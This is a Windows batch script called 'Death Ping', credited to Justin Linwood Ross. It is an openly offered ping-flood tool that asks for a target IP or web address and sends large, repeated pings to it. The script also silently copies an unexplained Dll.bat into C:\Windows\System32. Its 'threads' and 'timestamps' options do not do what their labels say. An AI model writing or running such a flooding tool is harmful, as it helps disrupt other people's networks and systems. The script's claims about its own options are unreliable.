@echo off
title Death Ping
color 0C
copy E:\Utilities\Dll.bat C:\Windows\System32
:a 
cls
echo +=================================+
echo #                                 #
echo #     Stasis X Death Ping     #
echo #                                 #
echo +=================================+
echo.
echo Copyright (c) by Justin Linwood Ross
echo Version 3.0
echo Web - http://astalavista.com
echo.
echo  System Info
echo -------------
echo.
echo Operating System : %os%
echo PC Name : %computername%
echo Username : "%username%"
echo Date : %date%
echo Time : %time%
echo.
set /p a=Enter IP or Web Address : 
if %a%==%a% goto size
:size 
set /p b=Enter buffer size [Max 65000] : 
if %b%==%b% goto thread
:thread
set /p c=Enter number of threads : 
if %c%==%c% goto time
:time
set /p d=Enter timestamps : 
if %d%==%d% goto pod
:pod 
ping %a% -l %b% -n %c%
pause>nul
goto a 